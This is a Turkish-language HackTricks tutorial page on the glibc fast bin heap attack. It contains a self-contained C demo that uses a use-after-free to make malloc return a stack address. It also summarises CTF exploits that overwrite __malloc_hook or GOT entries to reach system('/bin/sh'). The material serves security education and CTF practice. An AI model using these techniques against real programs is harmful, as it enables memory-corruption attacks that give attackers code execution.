# Hızlı Bin Saldırısı

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

Hızlı bin nedir hakkında daha fazla bilgi için bu sayfayı kontrol edin:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

Hızlı bin, tek yönlü bağlı liste olduğundan diğer tipteki depolama alanlarına göre çok daha az korumaya sahiptir ve sadece **bir serbest bırakılmış hızlı bin** parçasındaki bir adresi değiştirmek, daha sonra **herhangi bir bellek adresinde bir parça tahsis etmenin mümkün olmasını sağlar**.

Özetle:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

Çok iyi açıklanmış bir kodda tam bir örnek bulabilirsiniz: [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html):
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
Eğer global değişken **`global_max_fast`**'in değeri büyük bir sayıyla üzerine yazılabilirse, bu daha büyük boyutlarda hızlı bin parçaları oluşturmayı mümkün kılar, bu da önceden mümkün olmayan senaryolarda hızlı bin saldırıları gerçekleştirmeye olanak tanır. Bu durum [büyük bin saldırısı](large-bin-attack.md) ve [sıralanmamış bin saldırısı](unsorted-bin-attack.md) bağlamında kullanışlıdır.
{% endhint %}

## Örnekler

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* Parçalar tahsis edilebilir, serbest bırakılabilir, içerikleri okunabilir ve doldurulabilir (bir taşma güvenlik açığı ile).
* **Bilgi sızdırma için parçayı birleştir**: Tekniğin temelinde taşmayı kötüye kullanarak sahte bir `prev_size` oluşturmak vardır, böylece bir önceki parçalar daha büyük bir parçanın içine yerleştirilir, bu nedenle başka bir parçayı içeren daha büyük bir parça tahsis edildiğinde, verileri yazdırmak ve libc (`main_arena+88`) adresini sızdırmak mümkün olur.
* **Malloc hook üzerine yazma**: Bunun için ve önceki üst üste gelme durumunu kötüye kullanarak, aynı belleğe işaret eden 2 parçaya sahip olmak mümkündü. Dolayısıyla, bunları ikisini de serbest bırakarak (korumaları atlamak için araya başka bir parça serbest bırakarak) aynı parçayı hızlı binde 2 kez elde etmek mümkündü. Sonra, tekrar tahsis edilebilir, bir sonraki parçanın adresini `__malloc_hook`'un biraz öncesine işaret edecek şekilde üzerine yazmak (böylece malloc'un bir boş boyut olarak düşündüğü bir tamsayıya işaret etmesi - başka bir atlatma), bunu tekrar tahsis etmek ve ardından malloc hook adreslerini alacak başka bir parça tahsis etmek mümkün olur.\
Sonunda bir **tek araç** oraya yazılmış olur.
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* Bir parça serbest bırakıldığında, aşırı kullanım ve çift serbest bırakma olasılığı vardır çünkü serbest bırakılan bir parçayı yeniden kullanmak ve yeniden serbest bırakmak mümkündür.
* **Libc bilgi sızıntısı**: Sadece bazı parçaları serbest bırakın ve bunlar ana arena konumunun bir kısmına bir işaretçi alacak şekilde olacaktır. Serbest bırakılan işaretçileri yeniden kullanabileceğinizden, bu adresi okuyun.
* **Hızlı bin saldırısı**: Tahsis edilen tüm parçaların işaretçileri bir dizi içinde depolanır, bu nedenle birkaç hızlı bin parçasını serbest bırakabilir ve en sonuncusunda adresi bu işaretçi dizisinin biraz öncesine işaret edecek şekilde üzerine yazabiliriz. Sonra, aynı boyutta birkaç parça tahsis ederiz ve önce gerçek parçayı ve ardından işaretçi dizisini içeren sahte parçayı alırız. Şimdi bu tahsis işaretçilerini üzerine yazarak `free`'nin GOT adresini `system`'e işaret etmesini sağlayabiliriz ve ardından chunk 1'e `"/bin/sh"` yazarak `free(chunk1)` çağrısı yapabiliriz ki bu da aslında `system("/bin/sh")`'i çalıştıracaktır.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* Sıralanmamış parçaları birleştirmek ve bir libc bilgi sızıntısı elde etmek için bir bayt taşmasını kötüye kullanma örneği ve ardından malloc hook'u bir tek araç adresiyle üzerine yazmak için hızlı bin saldırısını gerçekleştirmek için bir örnek
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* Bir libc adresi ve bir PIE adresi sızdırmak için sıralanmamış parçaları kötüye kullanma ve UAF ile bilgi sızdırmak için bir bilgi sızıntısı sonrası, bu CTF'nin sömürüsü, kontrol edilen parçaların bulunduğu yere bir parça tahsis etmek için hızlı bin saldırısını kullandı, böylece belirli işaretçileri üzerine yazarak GOT'ta bir tek araç yazmak mümkün oldu
* Bir hızlı bin saldırısının sıralanmamış bir parça saldırısı aracılığıyla kötüye kullanıldığı bir örneği bulabilirsiniz:
* Hızlı bin saldırıları gerçekleştirmeden önce genellikle libc/heap adreslerini sızdırmak için serbest listeleri kötüye kullanmanın yaygın olduğunu unutmayın (gerektiğinde).
* [**Robot Fabrikası. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
* Yalnızca `0x100`'den büyük boyutta parçalar tahsis edebiliriz.
* Bir Sıralanmamış Bin saldırısı kullanarak `global_max_fast`'ı üzerine yazma (ASLR nedeniyle 1/16 kez çalışır, çünkü 12 biti değiştirmemiz gerektiği için, ancak 16 biti değiştirmemiz gerekmektedir).
* Global bir parça dizisini değiştirmek için Hızlı Bin saldırısı. Bu, GOT'u değiştirmeye ve bazı işlevleri `system`'e işaret etmeye olanak tanıyan bir keyfi okuma/yazma ilkesi sağlar.

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarını göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek paylaşın.

</details>
{% endhint %}
